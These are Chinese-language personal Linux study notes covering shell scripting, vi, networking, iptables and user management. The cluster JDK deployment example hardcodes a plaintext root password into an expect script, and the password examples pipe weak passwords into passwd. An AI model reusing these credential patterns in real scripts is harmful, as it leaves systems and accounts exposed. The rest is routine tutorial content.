条件满足，执行&amp;&amp;后面的语句；条件不满足，执行||后面的语句 条件判断组合 条件判断组合有两种使用方式： [] 和 [[]] 注意它们的区别： [[ ]] 中逻辑组合可以使用 &amp;&amp; || 符号 [] 里面逻辑组合可以用 -a -o 常用判断运算符1. 字符串比较 = 判断相等!= 判断不相等-z 字符串长度是为0返回true-n 字符串长度是不为0返回true 2. 整数比较 -lt 小于 less than -le 小于等于 -eq 等于 -gt 大于 great than -ge 大于等于 -ne 不等于 3. 文件判断 -d 是否为目录 if [ -d /bin ]; then echo ok; else echo notok;fi -f 是否为文件 if [ -f /bin/ls ]; then echo ok; else echo notok;fi -e 是否存在 if [ -e /bin/ls ]; then echo ok; else echo notok;fi 2.3.2、while1234567891011121314151617181920212223242526while expressiondo command ……done----------------------i=1while ((i&lt;=3))do echo $i let i++done----------------------#!/bin/bashi=1while [ $i -le 3 ]do echo $i let i++done# 命令执行完毕，控制返回循环顶部，从头开始直至测试条件为假# 换种方式：循环体会一直执行，直到条件表达式expression为false# 注意：上述let i++ 可以写成 i=$(($i+1))或者i=$((i+1)) 2.3.3、caseCase语法（通过下面这个例子展示）： 12345678910case $1 instart) echo "starting" ;;stop) echo "stoping" ;;*) echo "Usage: &#123;start|stop&#125;"esac 2.3.4、for语法格式： 1234567for 变量 in 列表docommand……done# 列表是一组值（数字、字符串等）组成的序列，每个值通过空格分隔。每循环一次，就将列表中的下一个值赋给变量 三种方式 12345678# 方式1for N in 1 2 3; do echo $N; done# 方式2for N in &#123;1..3&#125;; do echo $N; done# 方式3for ((i=0; i&lt;=2; i++)); do echo "welcome $i times"; done 2.3.5、util语法结构： 123456789101112131415161718192021222324until expressiondo command ……done# expression一般为条件表达式，如果返回值为 false，则继续执行循环体内的语句，否则跳出循环。# 换种方式说：循环体会一直执行，直到条件表达式expression为true## 示例#!/bin/bash## vi util.sha=0until [ ! $a -lt 3 ]do echo $a a=`expr $a + 1`done----输出: 012 2.4、数组在Shell中，用括号来表示数组，数组元素用“空格”符号分割开。定义数组的一般形式为 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061array_name=(value1 ... valuen)例子：mingxing=(huangbo xuzheng wangbaoqiang)也可以单独定义：mingxing[3]=liujialing读取数组元素的格式是：$&#123;array_name[index]&#125;============================================# 获取数组下标： 前面加 `!`[linux@linux ~]$ echo $&#123;!mingxing[@]&#125; 或者[linux@linux ~]$ echo $&#123;!mingxing[*]&#125;---输出: 0 1 2 3============================================# 输出数组的所有元素：直接取值[linux@linux ~]$ echo $&#123;mingxing[*]&#125;[linux@linux ~]$ echo $&#123;mingxing[@]&#125;============================================# 获取数组的长度：`#` [linux@linux ~]$ echo $&#123;#mingxing[*]&#125;[linux@linux ~]$ echo $&#123;#mingxing[@]&#125;============================================# 数组对接: 添加新的值[linux@linux ~]$ mingxing+=(liuyifei liuyufeng)============================================# 删除数组元素，但是会保留数组对应位置，就是该值的下标依然会保留，会空着，之后，还可以填充其他的值进来。# 删除第一个元素：之后 $&#123;mingxing[0]&#125; 就是空值了[linux@linux ~]$ unset mingxing[0]============================================# 遍历数组：#!/bin/bashIP=(192.168.1.1 192.168.1.2 192.168.1.3)# 第一种方式for ((i=0;i&lt;$&#123;#IP[*]&#125;;i++))doecho $&#123;IP[$i]&#125;done#第二种方式for ip in $&#123;IP[*]&#125;do echo $ipdone============================================# 数组的分片：$&#123;arr[@]:number1:number2&#125;这里number1从下标number1开始取值，number2往后取几个元素，即取到的新的数组的长度---cts1 ~ # arr=(1 2 3 4 5 6 7)cts1 ~ # echo "&#123;arr[@]:0:3&#125; --- $&#123;arr[@]:0:3&#125; "&#123;arr[@]:0:3&#125; --- 1 2 3cts1 ~ # echo "&#123;arr[@]:3:3&#125; --- $&#123;arr[@]:3:3&#125; "&#123;arr[@]:3:3&#125; --- 4 5 6cts1 ~ # echo "&#123;arr[@]:4:3&#125; --- $&#123;arr[@]:4:3&#125; "&#123;arr[@]:4:3&#125; --- 5 6 7 2.5、函数使用函数的语法使用示例 : 1234567891011121314[root@hadoop02 bin]# vi i.sh #!/bin/shhello()&#123; echo "`date +%Y-%m-%d`" # return 2&#125;helloecho “huangbo” # echo $?A="mazhonghua"echo $A---执行结果----“huangbo”mazhonghua 函数的调用方式就是直接写函数名就OK了 123注意：1、必须在调用函数地方之前，先声明函数，shell脚本是逐行运行。不会像其它语言一样先预编译2、函数返回值，只能通过$? 系统变量获得，可以显示加：return 返回，如果不加，将以最后一条命令运行结果，作为返回值。 return后跟数值n(0-255) 脚本调试： 使用-x选项跟踪脚本调试shell脚本，能打印出所执行的每一行命令以及当前状态 sh -x i.sh 或者在代码中加入：set -x 12345678910111213cts1 Desktop # sh -x i.sh+ hello++ date +%Y-%m-%d+ echo 2018-05-292018-05-29+ return 2+ echo $'\342\200\234huangbo\342\200\235'“huangbo”+ echo 00+ A=mazhonghua+ echo mazhonghuamazhonghua 2.6、函数参数直接上代码 123456789101112131415161718192021222324vim funcWithParam.sh--------sh文件--------#!/bin/bash# filename=funcWithParamfuncWithParam()&#123; echo "第一个参数为 $1 !" echo "第二个参数为 $2 !" echo "第十个参数为 $10 !" echo "第十个参数为 $&#123;10&#125; !" echo "第十一个参数为 $&#123;11&#125; !" echo "参数总数有 $# 个!" echo "作为一个字符串输出所有参数 $* !"&#125;funcWithParam 1 2 3 4 5 6 7 8 9 34 73--------------------# 调用cts1 Desktop # sh funcWithParam.sh第一个参数为 1 !第二个参数为 2 !第十个参数为 10 !第十个参数为 34 !第十一个参数为 73 !参数总数有 11 个!作为一个字符串输出所有参数 1 2 3 4 5 6 7 8 9 34 73 ! 2.7、跨脚本调用函数编写一个base.sh脚本，里面放放一个test函数 123456vim base.sh------#!/bin/bashtest()&#123; echo "hello"&#125; 再编写一个other.sh脚本，里面引入base.sh脚本，并且调用test函数： 12345678910111213vim other.sh--------#!/bin/bashsource base.sh ## 引入脚本test ##调用引入脚本当中的test函数============================================# 执行cts1 Desktop # sh other.shother.sh: line 2: ./base.sh: 权限不够cts1 Desktop # chmod 755 other.sh base.shcts1 Desktop # ./other.shhello 3、Shell综合案例3.1、打印9*9乘法表示例代码： 12345678910111213141516171819202122232425#!/bin/bashfor((i=1;i&lt;=9;++i))do for((j=1;j&lt;=i;j++)) do echo -ne "$i*$j=$((i*j))\t" done echodone# 解释-n 不加换行符-e 解释转义符echo 换行效果: 1*1=12*1=2 2*2=43*1=3 3*2=6 3*3=94*1=4 4*2=8 4*3=12 4*4=165*1=5 5*2=10 5*3=15 5*4=20 5*5=256*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=367*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=498*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=649*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81 3.2、自动部署集群的JDK1、 需求描述 12公司内有一个N个节点的集群，需要统一安装一些软件（jdk）需要开发一个脚本，实现对集群中的N台节点批量自动下载、安装jdk 2、 思路 思考一下：我们现在有一个JDK安装包在一台服务器上。那我们要实现这个目标： 1231、 把包传到每台服务器，或者通过本地yum源的方式去服务器取2、 给每台一台机器发送一个安装脚本，并且让脚本自己执行3. 要写一个启动脚本，用来执行以上两部操作 3、 Expect**的使用** 蛋疼点：假如在没有配置SSH免密登录的前提下，我们要要是scp命令从一台机器拷贝文件夹到另外的机器，会有人机交互过程，那我们怎么让机器自己实现人机交互？ 灵丹妙药：expect 命令 描述 set 可以设置超时，也可以设置变量 timeout 超时等待时间，默认 10s spawn 执行一个命令 send 执行交互，相当于手动输入 expect “”（expect内部命令） 匹配输出的内容 exp_continue 继续执行下面匹配 思路：模拟该人机交互过程，在需要交互的情况下，通过我们的检测给输入提前准备好的值即可 示例：观看配置SSH免密登录的过程 实现脚本： 123456789101112131415161718vi testExpect.sh## 定义一个函数sshcopyid()&#123; expect -c " spawn ssh-copy-id $1 expect &#123; \"(yes/no)?\" &#123;send \"yes\r\";exp_continue&#125; \"password:\" &#123;send \"$2\r\";exp_continue&#125; &#125; "&#125;## 调用函数执行sshcopyid $1 $2# 注意：如果机器没有expect，则请先安装expectyum install -y expect 4、 脚本实现 启动脚本initInstallJDK.sh 12345678910111213141516171819202122232425262728293031#!/bin/bashSERVERS="192.168.123.201"PASSWORD=hadoopBASE_SERVER=192.168.123.202auto_ssh_copy_id() &#123; expect -c "set timeout -1; spawn ssh-copy-id $1; expect &#123; *(yes/no)* &#123;send -- yes\r;exp_continue;&#125; *password:* &#123;send -- $2\r;exp_continue;&#125; eof &#123;exit 0;&#125; &#125;";&#125;ssh_copy_id_to_all() &#123; for SERVER in $SERVERS do auto_ssh_copy_id $SERVER $PASSWORD done&#125;ssh_copy_id_to_allfor SERVER in $SERVERSdo scp installJDK.sh root@$SERVER:/root ssh root@$SERVER chmod 755 installJDK.sh ssh root@$SERVER /root/installJDK.shdone 安装脚本installJDK.sh 1234567891011#!/bin/bashBASE_SERVER=192.168.123.202yum install -y wgetwget $BASE_SERVER/soft/jdk-8u73-linux-x64.tar.gztar -zxvf jdk-8u73-linux-x64.tar.gz -C /usr/localcat &gt;&gt; /etc/profile &lt;&lt;EOFexport JAVA_HOME=/usr/local/jdk1.8.0_73export PATH=\$PATH:\$JAVA_HOME/binEOF 4、总结写脚本注意事项： 1、开头加解释器： #!/bin/bash，和注释说明。 2、命名建议规则：变量名大写、局部变量小写，函数名小写，名字体现出实际作用。 3、默认变量是全局的，在函数中变量 local 指定为局部变量，避免污染其他作用域。 4、set -e 遇到执行非 0 时退出脚本， set -x 打印执行过程。 5、写脚本一定先测试再到生产上。]]></content>
      <categories>
        <category>Linux</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux学习笔记-2]]></title>
    <url>%2F2018%2F05%2F27%2FLinux%2FLinux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2%2F</url>
    <content type="text"><![CDATA[1. VI文本编辑器学会使用vi编辑器是学习Linux系统的必备技术之一，因为一般的Linux服务器是没有GUI界面的，Linux运维及开发人员基本上都是通过命令行的方式进行文本编辑或程序编写的。vi编辑器是Linux内置的文本编辑器，几乎所有的类unix系统中都内置了vi编辑器，而其它编辑器则不一定，另外很多软件会调用vi编辑进行内容编写，例如crontab定时任务。较之于其它编辑器或GUI编辑器，vi编辑速度是最快的。VIM是它的增强版本，VI有三种基本工作模式，分别是： 命令模式（command mode）、或者叫一般模式 插入模式（insert mode）、或者叫编辑模式 底行模式（last line mode）、或者叫命令行模式 1. 最基本用法 1、首先会进入“一般模式”，此模式只接受各种命令快捷键，不能编辑文件内容 2、按i键，就会从一般模式进入编辑模式，此模式下，敲入的都是文件内容 3、编辑完成之后，按Esc键退出编辑模式，回到一般模式 4、再按：，进入“底行命令模式”，输入wq命令，回车即可保存退出 2. 移动光标 (一般模式) 1、 使用上下左右键可以移动光标 2、 使用h,j,k,l，依次是向左，下，上，右移动 3、 w：将光标移动到下一个单词的首字母处 4、 W：利用空格向后移动光标，就是忽略标点 5、 b：利用word包括标点向前移动光标, 与w相对应 6、 B：利用空格向前移动光标，忽略标点 7、 e：将光标移动到下一个word的尾部，包括符号 8、 E: 将光标移动到下一个空格分隔字的尾部 9、 (：移动到句子开始 10、 )：移动到句子结束 11、 0：移动光标到本句句首 12、 $：移动光标到本行行尾 13、 {：移动到段落开始 14、 }：移动到段落结束 15、 H：屏幕顶端 16、 L：屏幕底端 17、 M：移动到屏幕中央位置 18、 gg：直接跳到文件的首行行首 19、 G：直接跳到文件的末行行首 20、 最强光标移动： % : 匹配括号移动，包括(, {, [.（你需要把光标先移到括号上） *: 匹配光标当前所在的单词，移动光标到下一个匹配单词 #: 匹配光标当前所在的单词，移动光标到上一个匹配单词 重点总结: h l : 左右, j k : 下上. w: 下一个单词 , b: 上一个单词. 0: 本行行首, $: 本行行尾 (: 句子开始, ): 句子结束 {: 段落开始 }: 段落结束 gg: 文件行首 G: 文件行尾 %: 下一个括号 *: 下一个单词 #: 上一个单词 3. 常用操作(一般模式 &gt;&gt; 插入模式) 单位 指令1 指令2 当前位 前一位/后一位 i: 在光标前一位开始插入 a: 光标后一位开始插入 当前行 最前/最后 I: 在该行的最前面插入 A: 在该行的最后插入 当前行 上一行/下一行 o: 小o, 当前行的下一行插入空行 O: 大o, 当前内容下移一行, 当前行插入空行 当前行 删除 dd: 删除当前行 3dd: ndd, 删除从当前行开始的 n行 当前行 复制 yy: 复制光标所在行 3yy: 复制从当前行开始的3行 粘贴 p: 粘贴到光标所在行的下一行 撤销 u: undo 撤销操作, 可一直撤销到最前面 重点总结: i : 当前光标前开始插入; a: 光标后一位开始插入 I: 在该行的最前面插入; A: 在该行的最后插入 o: 小o, 当前行的下一行插入空行 O: 大o, 当前内容下移一行, 当前行插入空行 dd: 删除当前行 3dd: ndd, 删除从当前行开始的 n行 yy: 复制光标所在行 3yy: 复制从当前行开始的3行 p: 粘贴到光标所在行的下一行 u: undo 撤销操作, 可一直撤销到最前面 4. 查找并替换 在底行命令模式中输入 1. 显示行号 :set nu 2. 隐藏行号 :set nonu 3 .查找关键字 :/you ## 效果：查找文件中出现的you，并定位到第一个找到的地方，按 n可以定位到下一个匹配位置（按N定位到上一个） 查询的时候被匹配上的字符串会被高亮，可以在命令模式下使用:noh取消高亮 4. 直接跳转到 3行 : 3 5. 替换操作 :1 s/sad/bbb 将第一行的第一个sad替换为bbb :1,5 s/sad/bbb 将第一行到第五行的第一个sad替换为bbb :1,. s/sad/bbb 将第一行到光标行的第一个sad替换为bbb :.,$ s/sad/bbb 将光标行到缓冲区最后一行的sad替换为bbb :s/sad/bbb 查找光标所在行的第一个sad，替换为bbb :s/sad/bbb/g 查找光标所在行的所有sad，替换为bbb :%s/sad/bbb 查找文件中所有行第一次出现的sad，替换为bbb :%s/sad/bbb/g 查找文件中所有的sad，替换为bbb 6. 屏幕翻滚类命令 Ctrl + u：向文件首翻半屏 Ctrl + d：向文件尾翻半屏 Ctrl + f：向文件尾翻一屏 Ctrl＋b：向文件首翻一屏 nz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部 7. 其它的小技巧 r 替换光标处一个字符 R 进入替换模式，从光标处连续替换 s 删除当前字符，进入插入模式 S 删除当前行，进入插入模式 ≈ dd, dd也会删除当前行, 但是不会进入插入模式 f s 光标行内向后查找第一个出现的字符s (先输f , 再输 s, 向后找 s) F s 光标行内向前查找第一个出现的字符s (先输F , 再输 s, 向前找 s) ~ 大小写转换，只转换光标处字符 8. 速查网址 vim详解 2. 网络管理ifconfig命令ifconfig命令主要用于配置网络接口，如果不加任何参数，则ifconfig命令用于查看当前所有活动网络接口的状态信息，如下图： eth0 表示第一块网卡，其中HWaddr表示网卡的物理地址，可以看到目前这个网卡的物理地址(MAC地址）是00:0C:29:D6:C7:0E。 inet addr 用来表示网卡的IP地址，此网卡的IP地址是192.168.179.6，广播地址192.168.170.255，掩码地址Mask:255.255.255.0。 lo 是表示主机的回坏地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口。比如把 httpd服务器的指定到回坏地址，在浏览器输入127.0.0.1就能看到你所架WEB网站了。但只是您能看得到，局域网的其它主机或用户无从知道。 ifconfig其他常用使用 -a 显示所有网络接口，包括停用的 -s 短格式显示网络信息，同netstat -i -v 显示详细信息，在网络出错的情况下适用 interface 指定网络接口 up 启用网络接口 down 关闭网络接口 启动关闭指定网卡&amp; 常用操作： 12345ifconfig eth0 up #启动网卡ifconfig eth0 down #关闭网卡 ifconfig #处于激活状态的网络接口ifconfig -a #所有配置的网络接口，不论其是否激活ifconfig eth0 #显示eth0的网卡信息 网络配置1. 三种通信模式Vmware中的虚拟机和宿主机进行通信有三种网络方式 一、Brigde――桥接：默认使用VMnet0 原理: Bridge 桥”就是一个主机，这个机器拥有两块网卡，分别处于两个局域网中，同时在”桥”上，运行着程序，让局域网A中的所有数据包原封不动的流入B，反之亦然。这样，局域网A和B就无缝的在链路层连接起来了，在桥接时，VMWare网卡和物理网卡应该处于同一IP网段 当然要保证两个局域网没有冲突的IP. VMWare 的桥也是同样的道理，只不过，本来作为硬件的一块网卡，现在由VMWare软件虚拟了！当采用桥接时，VMWare会虚拟一块网卡和真正的物理网卡就行桥接，这样，发到物理网卡的所有数据包就到了VMWare虚拟机，而由VMWare发出的数据包也会通过桥从物理网卡的那端发出。 所以，如果物理网卡可以上网，那么桥接的软网卡也没有问题了，这就是桥接上网的原理了。 联网方式： 这一种联网方式最简单，在局域网内，你的主机是怎么联网的，你在虚拟机里就怎么连网。把虚拟机看成局域网内的另一台电脑就行了！ 提示：主机网卡处在一个可以访问Internet的局域网中，虚拟机才能通过Bridge访问Internet。 二、NAT――网络地址转换 ：默认使用VMnet8 原理： NAT 是 Network address translate的简称。NAT技术应用在internet网关和路由器上，比如192.168.0.123这个地址要访问internet，它的数据包就要通过一个网关或者路由器，而网关或者路由器拥有一个能访问internet的ip地址，这样的网关和路由器就要在收发数据包时，对数据包的IP协议层数据进行更改（即 NAT），以使私有网段的主机能够顺利访问internet。此技术解决了IP地址稀缺的问题。同样的私有IP可以网关NAT 上网。 VMWare的NAT上网也是同样的道理，它在主机和虚拟机之间用软件伪造出一块网卡，这块网卡和虚拟机的ip处于一个地址段。同时，在这块网卡和主机的网络接口之间进行NAT。虚拟机发出的每一块数据包都会经过虚拟网卡，然后NAT，然后由主机的接口发出。 虚拟网卡和虚拟机处于一个地址段，虚拟机和主机不同一个地址段，主机相当于虚拟机的网关，所以虚拟机能ping到主机的IP，但是主机ping不到虚拟机的IP。 联网方式： 方法1、动态IP地址。 主机是静态IP或动态IP，都无所谓，将虚拟机设置成使用DHCP方式上网,Windows下选择“自动获取IP“，linux下开启DHCP服务即可。（这种方法最简单，不用过多的设置，但要在VMware中进行“编辑→虚拟网络设置”，将NAT和DHCP都开启了。一般NAT默认开启，DHCP默认关闭） 方法2、静态IP地址。 如果不想使用DHCP，也可以手动设置： IP设置与vmnet1同网段,网关设置成vmnet8的网关（在“虚拟网络设置”里的Net选项卡里能找到Gateway）通常是xxx.xxx.xxx.2。子网掩码设置与VMnet8相同（设置好IP地址后，子网掩码自动生成）DNS设置与主机相同。 例如：主机IP是10.70.54.31,设置虚拟机IP为10.70.54.22。Netmask,Gateway,DNS都与主机相同即可实现 虚拟机 —主机 虚拟机互联网 通信。 提示：使用NAT技术，主机能上网，虚拟机就可以访问Internet，但是主机不能访问虚拟机。 三、Host-Only――私有网络共享主机：默认使用VMnet1 联网方法： 方法1、动态IP地址。像上面那样开启DHCP后，虚拟机直接自动获取IP地址和DNS。就可以和主机相连了。当然，还要进行一些局域网共享的操作，这里不再赘述。 方法2、静态IP地址。 也可以手动设置，将虚拟机IP设置与VMnet1同网段,网关设置成VMnet1的网关相同,其余设置与VMnet1相同,DNS设置与主机相同。 例如：VMnet1 IP:172.16.249.1 Gateway :172.16.249.2 那么虚拟机 IP:172.16.249.100 Gateway: 172.16.249.2 这样、 虚拟机主机 可以通信但是、 虚拟机互联网 无法通信 提示：Host-only技术只用于主机和虚拟机互访，于访问internet无关。 2. NAT网络模式的配置见Linux学习笔记3, 第8条: Linux虚拟主机集群测试环境基本搭建 3. 其它的常用网络管理命令 ping命令: 常用来测试网络连接是否正常 先确定能ping通 ping www.baidu.com host命令: host命令用来进行DNS查询 然后用host命令可以查看到 host www.baidu.com 然后通过浏览器访问该地址：119.75.213.61 netstat命令: netstat命令可以显示网络接口的很多统计信息，包括打开的socket和路由表 以下是常用命令选项 123456789101112-a (all)显示所有选项，默认不显示LISTEN相关-t (tcp)仅显示tcp相关选项-u (udp)仅显示udp相关选项-n 拒绝显示别名，能显示数字的全部转化成数字-l 仅列出有在 Listen (监听) 的服務状态-p 显示建立相关链接的程序名-r 显示路由信息，路由表-e 显示扩展信息，例如uid等-s 按各个协议进行统计-c 每隔一个固定时间，执行该netstat命令 例子 1、列出所有端口，包括监听和未监听的：netstat -a 2、列出所有TCP端口：netstat -at 3、列出所有UDP端口：netstat -au 4、列出所有监听状态的TCP端口：该命令最重要用来查看哪个程序占用了哪个网络端口号 123# 比如查看谁占用了 tcp 的80 端口netstat -nltp | grep 80 [23:04:54]tcp 0 0 :::80 :::* LISTEN 3890/httpd 4. 防火墙防火墙根据配置文件/etc/sysconfig/iptables来控制本机的“出、入”网络访问行为 其对行为的配置策略有四个策略表 基础必备技能 | 查看防火墙状态 | service iptables status || ———————- | —————————– || 开启防火墙 | service iptables start || 关闭防火墙 | service iptables stop || 关闭防火墙开机自启 | chkconfig iptables off || 设置防火墙开机自启 | chkconfig iptables on || 查看防火墙开机启动状态 | chkconfig iptables –list | 扩展知识 1234567891011121314151617181920212223242526# 1、列出iptables规则iptables -L -n# 列出iptables规则并显示规则编号iptables -L -n --line-numbers# 2、列出iptables nat表规则（默认是filter表）iptables -L -n -t nat# 3、清除默认规则（注意默认是filter表，如果对nat表操作要加-t nat）#清除所有规则iptables -F#重启iptables发现规则依然存在，因为没有保存service iptables restart#保存配置service iptables save# 4、禁止SSH登陆（如果服务器在机房，一定要小心）iptables -A INPUT -p tcp --dport 22 -j DROP# 5、删除规则iptables -D INPUT -p tcp --dport 22 -j DROP # 6、加入一条INPUT规则开放80端口 iptables -I INPUT -p tcp --dport 80 -j ACCEPT 3. Linux系统启动级别管理使用runlevel命令可以查看系统运行的级别 12runlevel [23:12:37]N 3 修改系统默认启动级别 1234567891011121314# 启动级别在这个路径查看vi /etc/inittab-------------------# Default runlevel. The runlevels used are:# 0 - halt (Do NOT set initdefault to this)# 1 - Single user mode# 2 - Multiuser, without NFS (The same as 3, if you do not have networking)# 3 - Full multiuser mode# 4 - unused# 5 - X11# 6 - reboot (Do NOT set initdefault to this)#id:3:initdefault: id:3:initdefault: ## 配置默认启动级别 ## 通常将默认启动级别设置为：3 4. 用户和组1. 用户和组的概念Linux是一个多任务多用户的操作系统，当我们在使用ls -l命令的时候我们看到如下信息： 123drwxrwxr-x. 2 root root 4096 5月 24 00:15 test-rw-r--r--. 1 root root 58 5月 25 11:00 test.sh-rwxr-xr-x. 1 root root 35 5月 23 23:55 test.txt test：表示文件或者目录，具体的文件类型是由该行最前面的那个符号表示 12345- 当为[ *d* ]则是目录- 当为[ *-* ]则是文件；- 若是[ *l* ]则表示为链接文档(link file)；- 若是[ *b* ]则表示为装置文件里面的可供储存的接口设备(可随机存取装置)；- 若是[ *c* ]则表示为装置文件里面的串行端口设备，例如键盘、鼠标(一次性读取装置); drwxrwxr-x ：该文件的类型和权限信息 2 ：链接数，如果是文件则是1 ， 如果是文件夹则表示该文件夹下的子文件夹个数 第一个root ：文件或者目录的所属者** 第二个root ：所属用户组** 4096 ：文件或者目录的大小，是目录的话一般都是4096 5月 24 00:15：文件的最后编辑时间 通过以上信息得知，每个文件都设计到用户和组的权限问题 在Linux中，用户是能够获取系统资源的权限的集合，组是权限的容器 Linux 用户类型 用户类型 描述 管理员root 具有使用系统所有权限的用户,其UID 为0 系统用户 保障系统运行的用户,一般不提供密码登录系统,其UID为1-499之间 普通用户 即一般用户,其使用系统的权限受限,其UID为500-60000之间. 与Linux用户信息相关的文件有两个：分别是/etc/passwd和 /etc/shadow 123456789101112# 查看文件/etc/passwd文件的内容，选取第一行：root:x:0:0:root:/root:/bin/bashroot:用户名x:密码占位符，密码保存在shadow文件内0:用户id，UID0:组id，GIDroot:注释信息/root:用户家目录/bin/bash:用户默认使用shell登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志 Linux用户组类型 用户组类型 描述 系统组 一般加入一些系统用户 普通用户组 可以加入多个用户 私有组/基本组 当创建用户时,如果没有为其指明所属组，则就为其定义一个私有的用户组，起名称与用户名同名，当把其他用户加入到该组中，则其就变成了普通组 与Linux用户组信息相关的文件有两个：分别是/etc/group和 /etc/gshadow 12345# 查看文件/etc/group文件内容，选取一个普通组行：hadoop:x:500:hadoop:组名x:组密码占位符500:组id 2. 用户操作Linux中的用户管理主要涉及到用户账号的添加、删除和修改。所有操作都影响/etc/passwd中的文件内容 选项12345678910111213-c&lt;备注&gt;：修改用户帐号的备注文字；-d&lt;登入目录&gt;：修改用户登入时的目录；-e&lt;有效期限&gt;：修改帐号的有效期限；-f&lt;缓冲天数&gt;：修改在密码过期后多少天即关闭该帐号；-g&lt;群组&gt;：修改用户所属的群组；-G&lt;群组&gt;；修改用户所属的附加群组；-l&lt;帐号名称&gt;：修改用户帐号名称；-L：锁定用户密码，使密码无效；-U:解除密码锁定。-s&lt;shell&gt;：修改用户登入后所使用的shell；-u&lt;uid&gt;：修改用户ID； 参数 登录名：指定要修改信息的用户登录名。 添加用户 useradd spark usermod -G bigdata spark ## 设置组, spark用户添加到bigdata组中 usermod -c “mylove spark” spark ## -c: 添加备注信息 一步完成：useradd -G bigdata -c “mylove” spark # spark用户添加到bigdata组中, 并设置备注为 mylover useradd -u 508 -g 514 -G 1001 user3 添加用户user3时, 指定用户uid 和 主组-g, 附属组-G, 组必须要先存在 useradd -u(添加的时候修改用户id) 508 -g 514(-g是添加组, 此组号码必须存在) 指定user4 的家目录 useradd -u 520 -g 1000 -d /home/user44 user4 1234567891011121314151617&gt; &gt; 不创建user4的家目录, user5刚创建的时候, 家就被毁了&gt; &gt; `useradd -u 508 -g 1000 -M user6&gt; &gt; &gt; &gt; 当user6没有家的时候, 这样显示&gt; &gt; `bash-4.1$ ....&gt; &gt; 此时应该这样操作&gt; &gt; cp -v /etc/skel/.b* /home/user6&gt; &gt; "/etc/skel/.bash_logout" -&gt; "/home/user6/.bash_logout"&gt; &gt; "/etc/skel/.bash_profile" -&gt; "/home/user6/.bash_profile"&gt; &gt; "/etc/skel/.bashrc" -&gt; "/home/user6/.bashrc"&gt; &gt; su user6&gt; &gt; [user6@cts1 shixuanji]$ &gt; &gt; &gt; &gt; --------&gt; &gt; 查看进程 ps -au | grep xxx&gt; &gt; 杀死进程 kill -9 xxx&gt; &gt; 123456&gt; &gt; # 不允许用户登录&gt; &gt; useradd -u 523 -g 1000 -s /sbin/nologin user7&gt; &gt; &gt; &gt; # 修改此用户登录权限为 /bin/bash&gt; &gt; usermod -s /bin/bash user7&gt; &gt; 设置密码 passwd spark 根据提示设置密码即可 创建密码工具 mkpasswd 下载： yum -y install expect mkpasswd -l 14 创建一个14位数的密码 mkpasswd -l 15 -s 0: -s是设置特殊符号的长度, 这里是不要特殊符号 123456789101112131415161718192021222324&gt; ### 修改密码&gt; # 此时只需要输入一遍密码&gt; passwd --stdin user4 &gt; &gt; # 通过管道可以直接更改&gt; echo "123" | passwd --stdin user4&gt; &gt; # 通过手动输入回车符 `\n` 来实现2遍确认 -e：激活转义字符。&gt; echo -e "123\n123\n" | passwd user4&gt; &gt; =======#额外知识点&gt; # 使用echo -e选项时，若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出：&gt; \a 发出警告声；&gt; \b 删除前一个字符；&gt; \c 最后不加上换行符号；&gt; \f 换行但光标仍旧停留在原来的位置；&gt; \n 换行且光标移至行首；&gt; \r 光标移至行首，但不换行；&gt; \t 插入tab；&gt; \v 与\f相同；&gt; \ 插入\字符；&gt; \nnn 插入nnn（八进制）所代表的ASCII字符；&gt; &gt; 修改用户 修改spark登录名为storm：usermod -l spark storm 将spark添加到bigdata和root组：usermod -G root,bigdata spark 查看spark的组信息：groups spark 1234567891011121314&gt; # usermod : usermodify&gt; # 使用的参数跟useradd 几乎一样&gt; &gt; chfn user4 : 修改用户的finger, 电话, 办公室等...&gt; # 修改后, 其实这里就是修改的备注选项&gt; $ ☞ grep shixuanji /etc/passwd&gt; shixuanji:x:500:500:airpoet,sh,110,110:/home/shixuanji:/bin/bash&gt; &gt; # 修改备注, 这里又把之前改chfn又改了&gt; $ ☞ usermod -c "哎呀我去" shixuanji&gt; $ ☞ grep shixuanji /etc/passwd &gt; shixuanji:x:500:500:哎呀我去:/home/shixuanji:/bin/bash&gt; &gt; 删除用户 userdel -r spark 加一个-r就表示把用户及用户的家目录, 信箱地址等都删除 查看用户的信息 id 用户名 root用户以其他用户的权限执行某条命令 123[~] su -c "touch /tmp/shixuanji.txt" - shixuanji 22:32:02[~] ls -l /tmp/shixuanji.txt 22:32:25-rw-rw-r--. 1 shixuanji shixuanji 0 5月 29 22:32 /tmp/shixuanji.txt 3. 组操作前面我们知道，组是权限的集合。在linux系统中，每个用户都有一个用户组，没有指定时都默认为私有组，私有组名同用户名一致，建立用户组的好处是系统能对一个用户组中的所有用户的操作权限进行集中管理。组管理涉及组的添加、删除和修改。组的增加、删除和修改实际上就对/etc/group文件的更新 添加一个叫bigdata的组 groupadd bigdata 查看系统当前有那些组 cat /etc/group 将spark用户添加到bigdata组中 usermod -G bigdata spark 或者 gpasswd -a spark bigdata 这两个命令的区分记忆技巧： 命令是什么，就证明对什么做操作，所以最后的参数就是命令的操作对象，中间的可选项表示要干嘛 将spark用户从bigdata组删除 gpasswd -d spark bigdata 将bigdata组名修改为bigspark groupmod -n bigspark bigdata 删除组 groupdel bigdata 4. 为用户配置sudoer权限普通情况下，使用普通用户进行一些简单的操作就OK，但是普通用户和root用户的区别就在于root用户能对系统做任何事，但是普通用户就不行。处处受限。那么假如在某些情况下，普通用户想拥有更大的权限做更多的事情，虽然有权限限制，但也不是不可以。部分操作还是可以赋予更高的权限让普通用户做一次。这就需要给普通用户配置root权限了。意思就是让普通用户使用root权限去做一些操作，这当然是需要配置的。 用root编辑 vi /etc/sudoers 直接用命令 visudo也可以直接编辑此文件 在文件的如下位置，为hadoop添加一行即可 